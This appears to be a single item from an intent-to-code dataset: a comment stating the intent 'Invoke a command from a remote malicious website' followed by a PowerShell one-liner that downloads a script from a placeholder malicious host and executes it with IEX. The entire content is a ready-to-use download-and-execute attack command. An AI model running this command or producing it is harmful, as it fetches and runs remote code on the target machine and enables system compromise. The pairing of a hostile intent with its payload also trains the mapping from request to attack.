# Natural language intent:
# Invoke a command from a remote malicious website

IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious_script.ps1')
